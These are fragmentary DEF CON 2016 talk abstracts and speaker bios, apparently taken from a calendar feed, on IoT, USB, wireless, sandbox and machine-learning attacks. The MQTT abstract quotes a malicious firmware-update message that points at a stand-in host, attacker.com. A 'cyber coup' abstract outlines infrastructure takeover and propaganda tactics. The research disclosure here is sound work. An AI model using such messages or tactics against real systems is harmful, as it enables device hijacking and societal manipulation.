DESCRIPTION:\n Light-Weight Protocol! Serious Equipment! Critical Implicat
 ions!\n Lucas Lundgren Senior Security Consultant\, FortConsult (Part of N
 CC Group)\n Neal Hindocha Principal Consultant\, FortConsult (Part of NCC 
 Group)\n \n The presentation will begin by discussing the protocol (http:/
 /mqtt.org/) and results from a simple query on shodan\, showing the number
  of servers directly available on the internet. We will then go through th
 e protocol specifications which shows that security is more or less non-ex
 istent. We are able to directly connect to many of the servers which are o
 pen to the internet\, and following protocol specifications\, see what dev
 ices they are communicating with.\n \n We will show how its possible to ex
 tract data on all subscriptions available on the server using a ruby scrip
 t\, which basically gives a detailed list of the devices. However\, it is 
 not only the list of devices we are getting. The data returned by our scri
 pt also contains things like session tokens (for web pages)\, social secur
 ity numbers\, phone numbers\, names and other sensitive data used for one 
 purpose or another in the communication to and from the devices. \n \n We 
 will show how messages can be posted into the message queues and in turn r
 eceived by the devices that subscribe to the various queues. This means th
 at we are able to issue commands targeting the range of devices we have di
 scovered\, that use this protocol. We have however also discovered that th
 is is not limited to messages and commands\, if supported by the device\, 
 we can actually issue firmware updated\, simply by sending something simil
 ar to "FIRMWAREUPDATEHERE:http://www.attacker.com/filename.bin".\n \n A sp
 ecific example of what we can see and do is a home automation system we di
 scovered. We got a list of every sensor and its status. Furthermore\, we g
 ot exact GPS coordinates from the mobile app used to control the home auto
 mation. So in this case\, not only were we able to control the system\, we
  even knew when the owner was away.\n \n The talk will move on to show var
 ious implementations where webclients and SQL servers are hooked in. Much 
 of the communication data is stored in various databases\, and because we 
 have access\, we can use MQTT to attack the database and web servers. \n \
 n Multiple tools have been developed by us already to support testing the 
 protocol and fuzzing endpoints. we will show the tools used in various dem
 os and release them at the end of the talk! These tools are currently scri
 pts containing various protocol implementations\, that can be used to targ
 et servers and extract\, or inject\, data.  We also have a small client th
 at implements all interesting areas of the protocol which we use for serve
 r-to-client testing.\n \n We believe this talk is going to have a signific
 ant impact on MQTT and anyone who uses it. This is an old protocol from 19
 99. Its fast and reliable\, but its missing security.  \n \n We also be be
 lieve this talk will trigger a discussion about light-weight IoT protocols
  and security\, which is much needed at this point in time.\n \n Lucas Lun
 dgren has a vast experience in IT security\, with the "bad luck" (or tende
 ncy) to annoy companies by reporting vulnerabilities in their products.\n 
 \n Lucas started breaking things at the age of twelve\, and has reported n
 umerous vulnerabilities in various products.\n \n Having worked with penet
 ration testing professionally for over 12 years\, Lucas has held IT Securi
 ty positions within companies such as Sony Ericsson and IOActive. He has a
 lso been part of Corelan Team before moving on to FortConsult (Part of NCC
  Group) \n \n Lucas has been breaking everything from OS vendors and finan
 cials\, and he has spent a considerable amount of time inside "impenetrabl
 e fortresses".\n \n Lucas is primarily focusing on penetration testing as 
 well as fuzzing and exploit development\, no matter the platform or medium
 \, were he also has a passion for IoT and Smart Technology.\n \n Neal Hind
 ocha has been working in the security industry since 1999. He began his wo
 rk at Symantec\, reverse engineering malware and writing signature for Sym
 antec's antivirus products. From there\, he moved on to penetration testin
 g\, and has since been a consultant for Verizon Business and Trustwave\, w
 here he helped build the mobile testing services and focused on deliveries
  for advanced projects.\n \n Currently\, Neal is a Principal Consultant at
  FortConsult (part of NCC Group)\, focusing on new service areas such as c
 loud and IoT\, whilst still reversing the odd malware and delivering pente

DESCRIPTION:\n Stargate: Pivoting Through VNC to Own Internal Networks\n Y
 onathan Klijnsma Senior Threat Intelligence Analyst\, Fox-IT\n Dan Tentler
  (Viss) Founder\, Phobos Group\n \n VNC is a great tool to use if you need
  to get to a box you're not physically near. The trouble with VNC is that 
 it was invented 15+ years ago and hasn't been improved upon in any signifi
 cant way. Besides the internet of things being sprinkled with VNC endpoint
 s\, there are companies which use VNC to such a large degree they need a V
 NC proxy on their perimeter to get to all the internal VNC hosts - some of
  which are ICS/SCADA devices. Stargate is the result of discovering a vuln
 erability in these VNC proxies that allows you to proxy basically anything
 . This allows you to do anything from using them as anonymous proxies\, co
 nduct reflective scanning\, pivoting into the internal network behind it\,
  and more. In this presentation we will show you exactly what Stargate is\
 , how we encountered it\, the 'fun' things you can do with the Stargates a
 ll around the globe and we will release the Stargate tool which anyone can
  use to talk to/through these devices.\n \n Yonathan Klijnsma is a senior 
 threat intelligence analyst working for Fox-IT\, a Dutch IT security compa
 ny. Yonathan specializes in the analysis and tracking of attack campaigns\
 , work out the attacker profiles and investigate the techniques and tools 
 used by attackers. Yonathan's area of focus lies in the espionage related 
 cases. Outside of work Yonathan likes taking things apart and figuring out
  how they work\; be it physical devices or digital like malware or ransomw
 are. Occasionally a write-up of one of these projects ends up on his perso
 nal blog. \n Dan Tentler is the founder and CEO of The Phobos Group\, a bo
 utique information security services company. Previously a co-founder of C
 arbon Dynamics\, and a security freelancer under the Aten Labs moniker\, D
 an has found himself in a wide array of different environments\, ranging f
 rom blue team\, to red team\, to purple team\, to ‘evil hacker for a cam
 era crew’. When not obtaining shells or explaining against how to get sh
 elled\, Dan enjoys FPV racing\, homebrewing\, and internet troublemaking.\

DESCRIPTION:\n pin2pwn: How to Root an Embedded Linux Box with a Sewing Ne
 edle\n Brad Dixon\, Hacker\n \n \n \n \n Security assessments of embedded 
 and IoT devices often begin with testing how an attacker could recover fir
 mware from the device. When developers have done their job well you'll fin
 d JTAG locked-up\, non-responsive serial ports\, locked-down uboot\, and p
 erhaps even a home brewed secure-boot solution. In this session you'll lea
 rn details of a useful hardware/software penetration technique to attempt 
 when you've run out of easier options. We've used this technique on two co
 mmercial device security assessments successfully and have refined the tec
 hnique on a series of test devices in the lab. This session will cover the
  prerequisites for successful application of the technique and give you he
 lpful hints to help your hack! Best of all this technique\, while a bit ri
 sky to the hardware\, is easy to try and doesn't require specialized equip
 ment or hardware modification. We are going to take pieces of metal and st
 ab them at the heart of the hardware and see what happens. For the hardwar
 e/firmware developer you'll get a checklist that you can use to reduce you
 r vulnerability to this sort of attack.\n \n Brad Dixon once told his pare
 nts that if they gave him a Commodore 64 it would be the last computer he'
 d ever want. He never got that Commodore 64. Nevertheless Brad managed to 
 become a computer nerd at a young age. Brad studied Computer Engineering a
 t Georgia Tech and jumped into embedded software engineering. He worked fo
 r many years helping developers to design embedded Linux into telecom\, ne
 twork\, and mobile products. Brad also took a turn as a product manager fo

DESCRIPTION:\n MouseJack: Injecting Keystrokes into Wireless Mice \n Marc 
 Newlin Security Researcher\, Bastille Networks\n \n What if your wireless 
 mouse was an effective attack vector? Research reveals this to be the case
  for mice from Logitech\, Microsoft\, Dell\, Lenovo\, Hewlett-Packard\, Gi
 gabyte\, and Amazon. Dubbed 'MouseJack'\, this class of security vulnerabi
 lities allows keystroke injection into non-Bluetooth wireless mice. Imagin
 e you are catching up on some work at the airport\, and you reach into you
 r laptop bag to pull out your phone charger. As you glance back at your sc
 reen\, you see the tail end of an ASCII art progress bar followed by your 
 shell history getting cleared. Before you realize what has happened\, an a
 ttacker has already installed malware on your laptop. Or maybe they just e
 xfiltrated a git repository and your SSH keys. In the time it took you to 
 plug in your phone\, you got MouseJacked. The attacker is camped out at th
 e other end of the terminal\, equipped with a commodity USB radio dongle a
 nd a directional patch antenna hidden in a backpack\, and boards her plane
  as soon as the deed is done. The reality of MouseJack is that an attacker
  can inject keystrokes into your wireless mouse dongle from over 200 meter
 s away\, at a rate of up to 7500 keystrokes per minute (one every 8ms). Mo
 st wireless keyboards encrypt the data going between the keyboard and comp
 uter in order to deter sniffing\, but wireless mouse traffic is generally 
 unencrypted. The result is that wireless mice and keyboards ship with USB 
 dongles that can support both encrypted and unencrypted RF packets. A seri
 es of implementation flaws makes it possible for an attacker to inject key
 strokes directly into a victim's USB dongle using easily accessible\, chea
 p hardware\, in most cases only requiring that the user has a wireless mou
 se. The majority of affected USB dongles are unpatchable\, making it likel
 y that vulnerable computers will be common in the wild for the foreseeable
  future. This talk will explain the research process that lead to the disc
 overy of these vulnerabilities\, covering specific tools and techniques. R
 esults of the research will be detailed\, including protocol behavior\, pa
 cket formats\, and technical specifics of each vulnerability. Additional v
 ulnerabilities affecting 14 vendors are currently in disclosure\, and will
  be revealed during this talk.\n \n Marc is a security researcher and soft
 ware engineer at Bastille Networks\, where he focuses on RF/IoT threats pr
 esent in enterprise environments. He has been hacking on software defined 
 radios since 2013\, when he competed as a finalist in the DARPA Spectrum C
 hallenge. In 2011\, he wrote software to reassemble shredded documents for
  the DARPA Shredder Challenge\, finishing the competition in third place o
 ut of 9000 teams.\n Twitter: @marcnewlin\n \n

SUMMARY:Universal Serial aBUSe: Remote physical access attacks\n

DTEND;TZID=US/Pacific;VALUE=DATE-TIME:20160806T150000
DESCRIPTION:\n Universal Serial aBUSe: Remote Physical Access Attacks\n Ro
 gan Dawes Researcher\, Sensepost Dominic White CTO\, SensePost\n \n \n \n 
 \n In this talk\, we’ll cover some novel USB-level attacks\, that can pr
 ovide remote command and control of\, even air-gapped machines\, with a mi
 nimal forensic footprint\, and release an open-source toolset using freely
  available hardware.\n \n In 2000\, Microsoft published its 10 Immutable l
 aws of security [1]. One of which was "if a bad guy has unrestricted acces
 s to your computer\, it's not your computer anymore." This has been robust
 ly demonstrated over the years. Examples include numerous DMA-access attac
 ks against interfaces such as firewire [2]\, PCMCIA and thunderbolt [3] as
  well as USB-based attacks including simple in-line keyloggers\, "evil mai
 d" attacks [4] and malicious firmware [5].\n \n Despite these warnings\, g
 roups such as the NSA were still able to use physical access to bypass sof
 tware controls with toolsets such as COTTONMOUTH [6]. Likewise\, criminals
  have been able to defraud banks with a handful of simple hardware tricks 
 [7]. While some progress has been made to secure some devices against some
  threats\, such as the use of full disc encryption\, or the impact of Appl
 e's secure enclave in the physical security of the iPhone [8]\, most lapto
 ps and desktops remain vulnerable to attacks via physical interfaces.\n \n
  In our experience\, organisations merely view USB devices as a channel fo
 r malware or unsanctioned communications\, and rely on protections placed 
 elsewhere in their defensive stack to deal with them\, but few deal with t
 he risk the USB interface presents directly. There are many scenarios wher
 e gaining physical access to hosts is plausible [9]\, and having done so c
 an provide access to "chewy" internal networks [10] ripe for lateral movem
 ent. \n \n While most people are familiar with USB devices\, many don't re
 alise the extent to which the USB standard allows seemingly innocuous devi
 ces to have multiple personalities. There has been an extensive amount of 
 research into malicious USB devices\, such as TURNIPSCHOOL [15]\, GoodFET/
 Facedancer [16]\, Shikra [17]\, Rubber Ducky [11]\, USBdriveby [12] and Ba
 dUSB [5]. However\, none of these implement an end-to-end attack either be
 cause that was not their intention\, they only focus on a part of the atta
 ck or the project was never completed.\n \n Additionally\, existing attack
 s are predominantly "send only" with no built-in bidirectional communicati
 ons. They usually rely on the executed payload and the host’s networks f
 or any advanced remote access. Thus\, these payloads can leave a significa
 nt forensic footprint in the form of network communications and on-host be
 haviours\, and leave them vulnerable to anti-malware controls. Numerous co
 mpanies are improving toolsets to detect such attacks [13][14]. Lastly\, t
 hese attacks are often "spray and pray"\, unable to account for variations
  in the user's behaviour or computer setup.\n \n Our approach is to create
  a stealthy bi-directional channel between the host and device\, with remo
 te connectivity via 3G/Wi-Fi/Bluetooth and offload the complexity to our h
 ardware\, leaving a small simple stub to run on the host. This talk will d
 iscuss the process of creating a set of malicious USB devices using low co
 st hardware. The design and toolkit will be released during the talk.\n \n
  Our toolkit provides three significant improvements over existing work. T
 he first is the ability to gain a stealthy bi-directional channel with the
  host via the device. No traffic is generated on the target network (i.e i
 t would work against air-gapped hosts). This is done via the use of either
  a raw HID device or standard USB class printer driver linked to our devic
 e\, with the stub merely wrapping commands and their output to our device.
  The second is the ability to communicate with the device remotely via Wi-
 Fi/3G/Bluetooth\, allowing for updates to the payloads\, exfiltration of d
 ata\, real-time interaction with the host and an ability to debug problems
 . This also has the advantage that any network controls are bypassed. Fina
 lly\, the stub running on the host will leave a minimal forensic trail\, m
 aking detection of the attack\, or analysis of it later\, difficult. For c
 ompleteness sake\, a new transport for metasploit was developed to allow m
 etasploit payloads to be used instead.\n \n Our hope is that the tools wil
 l provide a method of demonstrating the risk of physical bypasses of softw
 are security without an NSA budget\, and encourage defences to be built in
  this area.\n \n [1] "10 Immutable Laws of Security" https://technet.micro

DTEND;TZID=US/Pacific;VALUE=DATE-TIME:20160806T160000
DESCRIPTION:\n Playing Through the Pain? - The Impact of Secrets and Dark 
 Knowledge on Security and Intelligence Professionals\n Richard Thieme Thie
 meWorks\n \n Dismissing or laughing off concerns about what it does to a p
 erson to know critical secrets does not lessen the impact when those secre
 ts build a different map of reality than "normals" use and one has to cali
 brate narratives to what another believes. The cognitive dissonance that i
 nevitably causes is managed by some with denial who live as if refusing to
  feel the pain makes it disappear. But as Philip K. Dick said\, reality is
  that which\, when you no longer believe in it\, refuses to go away. And w
 hen cognitive dissonance evolves into symptoms of traumatic stress\, one i
 gnores those symptoms at one's peril. But the constraints of one's work of
 ten make it impossible to speak aloud about those symptoms\, because that 
 might threaten one's clearances\, work\, and career. The real cost of secu
 rity work and professional intelligence goes beyond dollars. It is measure
 d in family life\, relationships\, and mental and physical well-being. The
  divorce rate is as high among intelligence professionals as it is among m
 edical professionals\, for good reason - how can relationships be based on
  openness and trust when one's primary commitments make truth-telling and 
 disclosure impossible? Richard Thieme has been around that space for years
 . He has listened to people in pain because of the compelling necessities 
 of their work\, the consequences of their actions\, the misfiring of imper
 fect plans\, and the burdens of - for example - listening to terrorists sl
 it someone's throat in real time\, then having to act as if they had a nor
 mal day at the office. Thieme touched on some of this impact in his story\
 , "Northward into the Night\," published in the Ranfurly Review\, Big City
  Lit\, Wanderings and Bewildering Stories before collection in "Mind Games
 ." The story illuminates the emotional toll of managing multiple personas 
 and ultimately forgetting who you are in the first place. The bottom line 
 is\, trauma and secondary trauma have identifiable symptoms and they are e
 verywhere in the "industry." The "hyper-real" space which the national sec
 urity state creates by its very nature extends to normals\, too\, now\, bu
 t it's more intense for professionals. Living as "social engineers\," alwa
 ys trying to understand the other's POV so one can manipulate and exploit 
 it\, erodes the core self. The challenge is not abstract or philosophical\
 , it's existential\, fired into our faces every day at point blank range\,
  and it constitutes an assault on authenticity and integrity. Sometimes sa
 nity is at stake\, too\, and sometimes\, life itself. In one week\, two di
 fferent people linked to the CIA told Thieme that going into that agency w
 as like becoming a scientologist. Think about what that analogy means. For
  his own sake and sanity\, Thieme has thought about it a lot and that's wh
 at this talk is about - the real facts of the matter and strategies for ef
 fective life-serving responses. \n \n Richard Thieme is an author and prof
 essional speaker focused on the challenges posed by new technologies and t
 he future\, how to redesign ourselves to meet these challenges\, and creat
 ivity in response to radical change. His column\, ‘Islands in the Clicks
 tream\,’ was distributed to subscribers in sixty countries before collec
 tion as a book in 2004. When a friend at the National Security Agency said
  after they worked together on ethics and intelligence issues\, ‘The onl
 y way you can tell the truth is through fiction\,’ he returned to writin
 g short stories\, 19 of which are collected in "Mind Games." His latest wo
 rk is the stunning novel "FOAM\," published by Exurban Press September 201
 5. He is also co-author of the critically extolled "UFOs and Government: A
  Historical Inquiry\," a 5-year research project using material exclusivel
 y from government documents and other primary sources\, now in 65 universi
 ty libraries His work has been taught at universities in Europe\, Australi
 a\, Canada\, and the United States\, and he has guest lectured at numerous
  universities\, including Purdue University (CERIAS)\, the Technology\, Li
 teracy and Culture Distinguished Speakers Series of the University of Texa
 s\, the "Design Matters" lecture series at the University of Calgary\, and
  as a Distinguished Lecturer in Telecommunications Systems at Murray State

DESCRIPTION:\n Escaping The Sandbox By Not Breaking It\n Marco Grassi KEEN
 LAB of Tencent\n Qidan He KEENLAB of Tencent\n \n The main topic of this t
 echnical talk will be "sandboxes" and how to escape them. One of the main 
 component of the modern operating systems security is their sandbox implem
 entation. Android for example in recent versions added SELinux to their ex
 isting sandbox mechanism\, to add an additional layer of security. As well
  OS X recently added System Integrity Protection as a ‘system level’ s
 andbox\, in addition to the regular sandbox which is ‘per-process’. Al
 l modern OS focus on defense in depth\, so an attacker and a defender must
  know these mechanisms\, to bypass them or make them more secure. We will 
 focus on Android and iOS/OSX to show the audience the implementations of t
 he sandbox in these operating systems\, the attack surface from within int
 eresting sandboxes\, like the browser\, or applications sandbox. Then we w
 ill discuss how to attack them and escape from our restricted context to c
 ompromise further the system\, showcasing vulnerabilities. We think that c
 omparing Android with iOS/OSX can be very interesting since their implemen
 tation is different\, but the goal for attackers and defenders is the same
 \, so having knowledge of different sandboxes is very insightful to highli
 ght the limitations of a particular implementation. The sandboxes some yea
 rs ago were related mainly to our desktop\, mobile phone or tablet. But if
  we look now at the technology trend\, with Automotive and IOT\, we can un
 derstand that sandboxes will be crucial in all those technologies\, since 
 they will run on mainstream operating system when they will become more po
 pular.\n \n Marco Grassi is currently a Senior Security Researcher of the

 takes time\, and the fast stuff usually isn’t cheap. Iterative improveme
 nts compound the problem when you need to get software updates to multiple
  devices in the field. I’ll present a prototype platform for GSM anomaly
  detection (called SITCH) which uses cloud-delivered services to elegantly
  deploy\, manage\, and coordinate the information from many independent wi
 reless telemetry sensors (IoT FTW). We’ll talk about options and trade-o
 ffs when selecting sensor hardware\, securing your sensors\, using cloud s
 ervices for orchestrating firmware\, and how to collect and make sense of 
 the data you’ve amassed. Source code for the prototype will be released

 security (STAC)\n \n Managed Code Rootkits (MCRs) are terrifying post-expl
 oitation attacks that open the doors for cementing and expanding a foothol
 d in a target network. While the concept isn't new\, practical tools for d
 eveloping MCRs don't currently exist. Erez Metula released ReFrameworker i
 n 2010 with the ability to inject attack modules into the C# runtime\, pav
 ing the way for MCRs\, but the tool requires the attacker to have knowledg
 e of intermediate languages\, does not support other runtimes\, and is no 
 longer maintained. Worse yet\, the ‘write once\, run anywhere’ motto o
 f managed languages is violated when dealing with runtime libraries\, forc
 ing the attacker to write new exploits for each target platform. This talk
  debuts a free and open source tool called JReFrameworker aimed at solving
  the aforementioned challenges of developing attack code for the Java runt
 ime while lowering the bar so that anyone with rudimentary knowledge of Ja
 va can develop a managed code rootkit. With Java being StackOverflow's mos
 t popular server side language of 2015 the Java runtime environment is a p
 rime target for exploitation. JReFrameworker is an Eclipse plugin that all
 ows an attacker to write simple Java source to develop\, debug\, and autom
 atically modify the runtime. Best of all\, working at the intended abstrac
 tion level of source code allows the attacker to ‘write once\, exploit a
 nywhere’. When the messy details of developing attack code are removed f
 rom the picture the attacker can let his creativity flow to develop some t
 ruly evil attacks\, which is just what this talk aims to explore.\n \n Ben

DESCRIPTION:\n Picking Bluetooth Low Energy Locks from a Quarter Mile Away
 \n Anthony Rose Hacker\n Ben Ramsey\,\n Hacker\n \n \n \n Many Bluetooth L
 ow Energy (BLE) enabled deadbolts and padlocks have hit the market recentl
 y. These devices promise convenience and security through smartphone contr
 ol. We investigated sixteen of these products from multiple vendors and di
 scovered wireless vulnerabilities in most of them. Using a $50 antenna\, w
 e successfully picked vulnerable locks from over 400 meters away. In this 
 presentation we introduce open source tools to crack each of the vulnerabl
 e BLE locks. Furthermore\, after surveying the open source Bluetooth hacki
 ng tools currently available\, we find very little support for BLE. So\, t
 o make discovering and range finding to BLE devices easier\, we introduce 
 a new open source war-walking tool compatible with both Bluetooth Classic 
 and BLE.\n \n Anthony Rose is an electrical engineer with five years of ne

DESCRIPTION:\n CANSPY: a Framework for Auditing CAN Devices\n Jonathan-Chr
 istofer Demay Airbus Defence and Space \n Arnaud Lebrun Airbus Defence and
  Space\n \n \n \n \n In the past few years\, several tools have been relea
 sed allowing hobbyists to connect to CAN buses found in cars. This is welc
 omed as the CAN protocol is becoming the backbone for embedded computers f
 ound in smartcars. Its use is now even spreading outside the car through t
 he OBD-II connector: usage-based policies from insurance companies\, air-p
 ollution control from law enforcement or engine diagnostics from smartphon
 es for instance. Nonetheless\, these tools will do no more than what profe
 ssional tools from automobile manufacturers can do. In fact\, they will do
  less as they do not have knowledge of upper-layer protocols. Security aud
 itors are used to deal with this kind of situation: they reverse-engineer 
 protocols before implementing them on top of their tool of choice. However
 \, to be efficient at this\, they need more than just being able to listen
  to or interact with what they are auditing. Precisely\, they need to be a
 ble to intercept communications and block them\, forward them or modify th
 em on the fly. This is why\, for example\, a framework such as Burp Suite 
 is popular when it comes to auditing web applications. In this paper\, we 
 present CANSPY\, a framework giving security auditors such capabilities wh
 en auditing CAN devices. Not only can it block\, forward or modify CAN fra
 mes on the fly\, it can do so autonomously with a set of rules or interact
 ively using Ethernet and a packet manipulation framework such as Scapy. It
  is also worth noting that it was designed to be cheap and easy to build a
 s it is mostly made of inexpensive COTS. Last but not least\, we demonstra
 te its versatility by turning around a security issue usually considered w
 hen it comes to cars: instead of auditing an electronic control unit (ECU)
  through the OBD-II connector\, we are going to partially emulate ECUs in 
 order to audit a device that connects to this very connector.\n \n Jonatha

  you need to compromise the whole seismograph network. After got the root 
 shell our goal is execute a post exploitation attack \, This specific atta

  mechanisms is trivial...and worse yet\, the firewall's kernel core was fo

 ouching on generic firewall bypass techniques\, this talk will largely foc
 us on the kernel-mode vulnerability. Specifically\, I’ll discuss bypassi
 ng OS X specific anti-debugging mechanisms employed by the product\, rever
 se-engineering the firewall's I/O Kit kernel interfaces and 'authenticatio
 n' mechanisms\, and the discovery of the exploitable heap-overflow. \n \n

 ining talk. This time it’s bigger and badder than before. Are you sick a
 nd tired of your government? Can’t wait another 4 years for an election?
  Or do you want to be like the CIA and overthrow a government overseas for
  profit or fun? If you answered yes to one or more of these questions than
  this talk is for you! Why not create your own cyber mercenary unit and in
 voke a regime change to get the government you want installed? After all\,
  if you want the job done right\, sometimes you have to do it yourself. Fi
 nd out how over the last 60 years\, governments and resource companies hav
 e been directly involved in architecting regime changes around world using
  clandestine mercenaries to ensure deniability. This has been achieved by 
 destabilizing the ruling government\, providing military equipment\, assas
 sinations\, financing\, training rebel groups and using government agencie
 s like the CIA\, Mossad and MI-5 or using foreign private mercenaries such
  as Executive Order and Sandline. Working with Simon Mann an elite ex SAS 
 soldier turned coup architect who overthrew governments in Africa\, Chris 
 Rock will show you how mercenary coup tactics directly applied to digital 
 mercenaries to cause regime changes as the next generation of "Cyber Dogs 
 of War". Chris will walk you through a cyber regime change from start to f
 inish on a real country and show you how to architect a coup achieving the
  same result as a traditional mercenary operation without any blood spilt.
  This will include taking ownership of all facets of government including 
 finance\, telecommunications\, transportation\, commercial companies and c
 ritical infrastructure such a power\, water and oil. You will learn: • T
 raditional military mercenary coup tactics used by the infamous 32 Battali
 on in Africa\, Executive Order and Sandline that can be directly applied t
 o a cyber mercenary regime change. • How to architect a cyber coup using
  advisor’s\, hackers and the general populace\, using misinformation\, p
 rofessional agitators\, false information and financing. • How to gather
  intelligence to analyze a government’s systemic weaknesses on financial
 \, societal values and political climates that is leader or country specif
 ic to structure your attack. • How to identify and prioritize government
  resources\, infrastructure and commercial companies and how to use these 
 compromised assets to stage the coup. • Combine physical and digital tec
 hniques and have the best of both worlds to own a countries infrastructure
 . • Hot to manipulate the media using propaganda targeting journalists f
 lawed multiple "source" rules for a story. • The Grand finale of a cyber
  regime change on a real country from beginning to end using the above tec
 hniques with operational footage. Come to this talk and find out how you t
 oo can be your own dictator\, benevolent or merciless that part is up to y
 ou.\n \n Chris Rock presented "I will kill you" at DEF CON 23 has been act

DESCRIPTION:\n Jittery MacGyver: Lessons Learned from Building a Bionic Ha
 nd out of a Coffee Maker\n Evan Booth Engineer\n \n In May of 2015\, it wa
 s estimated that a pod-based coffee maker could be found in nearly one in 
 three American homes. Despite the continued popularity of these single-cup
  coffee conjurers at home as well as in the workplace\, it has become clea
 r that these devices are not impervious to mechanical and/or electrical fa
 ilure. It was this intersection of extremely prevalent hardware and relati
 vely short lifespan that prompted me to begin exploring the upper limits o
 f what could be created by repurposing one of the most popular pod-based m
 achines: the Keurig. In this session\, we will walk through some real-worl
 d examples of ‘MacGyver’-style creative problem-solving\, we'll go han
 ds on (yes\, pun intended) with stuff made from repurposed Keurigs\, and f
 inally\, I'll reflect on lessons learned from looking for potential in thi
 ngs most people deem common and unremarkable.\n \n Evan Booth Evan Booth l
 oves to build stuff out of other stuff\, he tends to break things for curi
 osity's sake. Throughout 2013 and into 2014\, in an effort to highlight hy
 pocrisy and "security theater" brought about by the TSA\, through a resear
 ch project called "Terminal Cornucopia\," Evan created an arsenal ranging 
 from simple\, melee weapons to reloadable firearms to remotely-trigger inc
 endiary suitcases—all solely comprised of items that anyone can purchase
  inside most airport terminals *after* the security checkpoint.\n \n Given
  the right ingredients\, a big cardboard box can be a time machine\, space
 ship\, minecart\, or a telephone booth that only calls people named "Steve
 " who live in the future.  Twitter: @evanbooth\n \n

DESCRIPTION:\n Machine Duping 101: Pwning Deep Learning Systems\n Clarence
  Chio ML Hacker\n \n Deep learning and neural networks have gained incredi
 ble popularity in recent years. The technology has grown to be the most ta
 lked-about and least well-understood branch of machine learning. Aside fro
 m it's highly publicized victories in playing Go\, numerous successful app
 lications of deep learning in image and speech recognition has kickstarted
  movements to integrate it into critical fields like medical imaging and s
 elf-driving cars. In the security field\, deep learning has shown good exp
 erimental results in malware/anomaly detection\, APT protection\, spam/phi
 shing detection\, and traffic identification. This DEF CON 101 session wil
 l guide the audience through the theory and motivations behind deep learni
 ng systems. We look at the simplest form of neural networks\, then explore
  how variations such as convolutional neural networks and recurrent neural
  networks can be used to solve real problems with an unreasonable effectiv
 eness. Then\, we demonstrate that most deep learning systems are not desig
 ned with security and resiliency in mind\, and can be duped by any patient
  attacker with a good understanding of the system. The efficacy of applica
 tions using machine learning should not only be measured with precision an
 d recall\, but also by their malleability in an adversarial setting. After
  diving into popular deep learning software\, we show how it can be tamper
 ed with to do what you want it do\, while avoiding detection by system adm
 inistrators.\n \n Besides giving a technical demonstration of deep learnin
 g and its inherent shortcomings in an adversarial setting\, we will focus 
 on tampering real systems to show weaknesses in critical systems built wit
 h it. In particular\, this demo-driven session will be focused on manipula
 ting an image recognition system built with deep learning at the core\, an
 d exploring the difficulties in attacking systems in the wild. We will int
 roduce a tool that helps deep learning hackers generate adversarial conten
 t for arbitrary machine learning systems\, which can help make models more
  robust. By discussing defensive measures that should be put in place to p
 revent the class of attacks demonstrated\, we hope to address the hype beh
 ind deep learning from the context of security\, and look towards a more r
 esilient future of the technology where developers can use it safely in cr
 itical deployments.\n \n Clarence Chio graduated with a B.S. and M.S. in C

 functionality to a standard list of desired capabilities only gets you so 
 far. And\, many vendors require an organization to pay for a framework\, o
 r for access to a framework\, to enable tactical and strategic campaigns. 
 Wouldn’t it be great to have an open source way to pick strategies? So w
 hat do you do? Build out your own defensive campaigns based on research\, 
 taxonomies and gameification. Building the attacker’s point of view is o
 ur expertise (at a CON). We have plenty of research here to talk about tha
 t point of view. How about building out the defender’s point of view bas
 ed on the attacker’s life cycle? Defenders can use this as a defensive 
 ‘compliment’ to begin a legitimate defensive campaign. Maybe the defen
 der could even ‘gamify’ the approach? An attacker’s approach\, a def
 ender’s approach and a progressive life cycle with a defender’s set of
  targets built on things we all know\, love and hate: project management. 
 I think we have a game! Build out rules\, much like real life\, then bring
  on the attackers\, bring on the defenders and play a little game to educa
 te\, demonstrate and evangelize. Watch strategies played by both attackers
  and defenders. Switch sides and learn to be a Purple Teamer! Digitize it 
 and watch the game play people or even play itself\; the true rise of the

  DEF CON has changed for the better since the days at the Alexis Park.  It
  has evolved from a few speaking tracks to an event that still offers the 
 speakers\, but also Villages\, where you can get hands-on experience and D
 emo Labs where you can see tools in action.  Of course\, there is still th
 e Entertainment and Contest Area\, as well as Capture The Flag.  There is 
 so much more to DEF CON than there was in the past and it is our goal to h
 elp you get the best experience possible.  In addition to introducing each
  of the different aspects and areas of DEF CON\, we have a panel of speake
 rs that will talk about how they came to be part of DEF CON and their pers
 onal experiences over the years. Oh yeah\, there is the time honored "Name
  the Noob"\, lots of laughs and maybe even some prizes.  Plus\, stay for t
 he after party.  Seriously\, there is an after party.  How awesome is that
 ?\n \n  Mike Petruzzi (wiseacre)  started at DEF CON participating in the 
 Capture the Flag contest.  Determined to do better the next year\, he part
 icipated again.  This time the format was 36 hours straight.  He realized 
 he was missing out on everything else that was happening at DEF CON.  From
  then on he made a point to participate in as much as he could.  Of course
 \, within the limits of social anxiety so\, if it allowed participation as
  a wallflower\, he was in!  Now\, he wants to make sure everyone else gets
  to know as much as possible about this year's conference.  In his private
  life\, Mike hacks managers and is happy anyone listens to him at all. Mik
 e would like to thank Highwiz for everything. \n \n Ryan "LosT" Clarke has
  been involved with DEF CON for 16 years. In addition to his role on the C
 FP board\, LosT serve's as DEF CON's official Cryptographer and Puzzle Mas
 ter. He is best known for his early LosT @ CON Mystery Challanges designed
  to force creative thinking\, and also introduced him to his amazing wife!
  Now he is responsible for designing the badges and lanyards for DEF CON\,
  in addition to torturing a subculture of enthusiastic crypto fans with hi
 s ever-so-subtle clues and red herring rabbit holes in his yearly Badge ch
 allenge. LosT enjoys learning as much as he can about as much as he can. H
 e can usually be found around CON in the 1o57 room\, mostly encouraging an
 d sometimes distracting a ragged band of sleep-deprived attendees who are 
 racing to complete the challenge.\n \n \n CrYpT first attended DEF CON at 
 DC10 as CrAzE\, where he made the common mistake of staying on the sidelin
 es and not actively participating in all DEF CON had to offer. The experie
 nce was tough for him and he did not return for many years. He tried again
  at DC17\, but this time he made the decision to start putting himself out
  there. After a marked improvement in the quality of his experience\, he w
 as determined to make each year better than the last. At DC20 he received 
 the handle CrYpT from Y3t1 and met some people who would remain his closes
 t friends to this day (looking at you Clutch). Now he leads the awesome\, 
 hard-working Inhuman Registration team in their quest to badge all the peo
 ple. He's a member of the CFP Review Board and Security Tribe. In an effor
 t to help welcome all the new faces at DEF CON\, he is returning for his s
 econd year to the DC 101 panel. He encourages people to reach out and ask 
 questions so they can get the most bang for their badge.\n \n Born of glit
 ter and moon beams\, HighWiz is the things that dreams are made of and nig
 htmares long to be... Years ago\, with the help of some very awesome peopl
 e* he set about to create an event that would give the n00bs of Def Con a 
 place to feel welcomed and further their own pursuit of knowledge. For yea
 rs he has held onto the simple tenet that "You get out of Def Con what you
